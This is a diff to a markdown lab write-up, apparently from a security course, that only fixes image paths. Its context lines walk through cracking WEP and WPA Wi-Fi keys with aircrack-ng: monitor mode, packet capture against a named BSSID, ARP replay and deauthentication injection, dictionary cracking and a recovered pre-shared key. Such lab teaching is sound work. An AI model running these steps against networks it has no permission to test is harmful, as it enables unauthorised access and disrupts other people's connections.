@@ -27,7 +27,7 @@ sudo airodump-ng wlp3s0mon -c 6
 
 Our target is "RSI-Wep"
 
-![WEP01Scan](wep_01_scan.png)
+![WEP01Scan](./wep_01_scan.png)
 
 with BSSID = `00:1E:E5:28:65:49`. With this information we can start another time `airodump` in order to capture data. 
 
@@ -37,7 +37,7 @@ $ sudo airodump-ng -c 6 --bssid 00:1E:E5:28:65:49 -w wep.cap wlp3s0mon
 
 and the situation is like this.
 
-![alt text](image-1.png)
+![alt text](./image-1.png)
 
 We need to generate some traffic in order to capture the right amount of IV (Initialization Vector) and retrive the password. To do that we use `aireplay-ng` that allowq us to send ARP requests from hosts to the access point. 
 
@@ -48,7 +48,7 @@ $ sudo aireplay-ng -3 wlp3s0mon -b 00:1E:E5:28:65:49
 ```
 
 
-![alt text](image-2.png)
+![alt text](./image-2.png)
 
 
 ```bash
@@ -59,7 +59,7 @@ $ sudo aircrack-ng ./wep.cap
 
 After few minuts o just a few seconds (if you have an host that generate an huge data traffic, like a video stream).
 You decrypt the password!
-![alt text](image-9.png)
+![alt text](./image-9.png)
 
 end then you can stop `airdump` and escape from monitor mode
 
@@ -80,7 +80,7 @@ $ iw dev
 $ sudo airmon-ng start wlp3s0
 $ sudo airodump-ng wlp3s0mon
 ```
-![alt text](image-4.png)
+![alt text](./image-4.png)
 
 ```bash
 # Start capture
@@ -89,7 +89,7 @@ $ sudo airodump-ng -c 6 --bssid  00:1E:E5:28:65:4B  -w wpa.cap wlp3s0mon
 $ sudo aireplay-ng -0 2 -a  00:1E:E5:28:65:4B  wlp3s0mon
 ```
 
-![alt text](image-5.png)
+![alt text](./image-5.png)
 
 ```bash
 $ sudo airmon-ng stop wlp3s0mon
@@ -137,7 +137,7 @@ $ sudo aircrack-ng -w ./toy_dict.txt wpa.cap
 
 or with our custom dict 
 
-![alt text](image-8.png)
+![alt text](./image-8.png)
 
 
 ## Start a Rainbow Table attack
@@ -167,6 +167,6 @@ The PSK is "nonmicraccheraimai".
 ```
 
 
-![alt text](image-7.png)
+![alt text](./image-7.png)
 
 
